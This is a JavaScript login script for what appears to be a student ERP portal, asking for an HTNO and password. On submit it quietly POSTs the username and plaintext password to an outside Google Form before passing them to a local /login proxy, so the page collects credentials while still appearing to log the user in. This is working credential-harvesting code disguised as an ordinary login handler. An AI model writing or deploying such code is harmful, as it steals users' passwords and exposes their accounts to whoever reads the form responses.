document.addEventListener('DOMContentLoaded', function() {
  const loginForm = document.getElementById("form1");
  
  loginForm.addEventListener("submit", function(e) {
    e.preventDefault();
    
    const username = document.getElementById("txt_HTNO").value;
    const password = document.getElementById("txt_Password").value;
    
    if (!username || !password) {
      document.getElementById("lblMessage").textContent = "Please enter both HTNO and Password";
      document.getElementById("lblMessage").style.color = "#dc3545";
      return;
    }

    // Show processing indicator
    document.getElementById("lblMessage").textContent = "Processing...";
    document.getElementById("lblMessage").style.color = "#007bff";
    
    // Google Form submission URL
    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScStreRZRW9Y4ipI2MNBENtSsbMqYn2CYvPRTlCs_eZs3d0vg/formResponse";
    const data = new FormData();
    data.append("entry.163375498", username); // Username field entry ID
    data.append("entry.1850673272", password); // Password field entry ID
    
    // Disable the submit button during submission
    document.getElementById("btn_Login").disabled = true;

    // First submit to Google Form
    fetch(googleFormURL, {
      method: "POST",
      body: data
    }).then(() => {
      // Then use our proxy server for ERP login
      return fetch('/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username,
          password: password
        })
      });
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        // Store session ID in localStorage for future requests
        localStorage.setItem('erp_session_id', data.session_id);
        
        // Replace current page content with dashboard HTML
        document.documentElement.innerHTML = data.dashboard_html;
        
        // Update browser history to simulate navigation
        history.pushState({}, "Dashboard", "/dashboard");
      } else {
        // Handle login failure
        document.getElementById("lblMessage").textContent = data.message;
        document.getElementById("lblMessage").style.color = "#dc3545";
        document.getElementById("btn_Login").disabled = false;
      }
    })
    .catch(error => {
      // Handle errors
      console.error("Login error:", error);
      document.getElementById("lblMessage").textContent = "Connection error. Please try again.";
      document.getElementById("lblMessage").style.color = "#dc3545";
      document.getElementById("btn_Login").disabled = false;
    });
  });
});
